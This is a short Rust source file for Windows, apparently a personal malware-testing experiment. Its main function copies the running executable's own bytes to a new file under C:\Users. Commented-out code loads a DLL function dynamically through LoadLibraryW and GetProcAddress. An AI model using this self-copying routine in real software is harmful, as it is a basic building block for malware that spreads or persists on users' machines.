extern crate widestring;
#[cfg(windows)]
extern crate winapi;

mod lib;
use lib::{
    append_file, close_handle, create_file, get_current_path, get_file_size, open_file, read_file,
    write_file,
};
use std::io::Error;

use std::ffi::CString;
use widestring::WideCString;

use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryW};
fn main() {
    copy_self_to_path("C:\\Users\\yay.exe");

    // let user32_w_str = WideCString::from_str(
    //     "C:\\Users\\chuon\\OneDrive\\Desktop\\testing_malware\\malware_simple.dll",
    // )
    // .unwrap();
    // let msgbox_w_str =
    //     CString::new("_ZN14malware_simple11create_file17h397a001df6317bd9E").unwrap();

    // let poop =
    //     unsafe { GetProcAddress(LoadLibraryW(user32_w_str.as_ptr()), msgbox_w_str.as_ptr()) };

    // /*
    //     let msgbox_ansi: extern "stdcall" fn(winapi::HWND,
    //                                      winapi::LPCSTR,
    //                                      winapi::LPCSTR,
    //                                      winapi::UINT
    // );*/
    // let create_file: fn(&str);
    // create_file = unsafe { std::mem::transmute(poop) };
    // println!("{:?}", poop);
    // create_file("C:\\Users\\chuon\\OneDrive\\Desktop\\testing_malware\\yeet.txt");
    // println!("{:?}", Error::last_os_error());
}

fn copy_self_to_path(file_path: &str) {
    let path = get_current_path().unwrap();

    let file_exe = open_file(String::from_utf16(&path).unwrap().as_str()).unwrap();
    let file_size = get_file_size(file_exe).unwrap();
    let mut buffer: Vec<u8> = Vec::new();

    for _i in 0..file_size as usize {
        buffer.push(0u8);
    }

    let byte_read = read_file(file_exe, &mut buffer).unwrap();
    close_handle(file_exe).unwrap();

    let mut new_buffer: Vec<u8> = Vec::new();

    for i in 0..byte_read as usize {
        new_buffer.push(buffer[i].clone());
    }

    let new_exe = create_file(file_path).unwrap();
    write_file(new_exe, new_buffer).unwrap();
    close_handle(new_exe).unwrap();
}
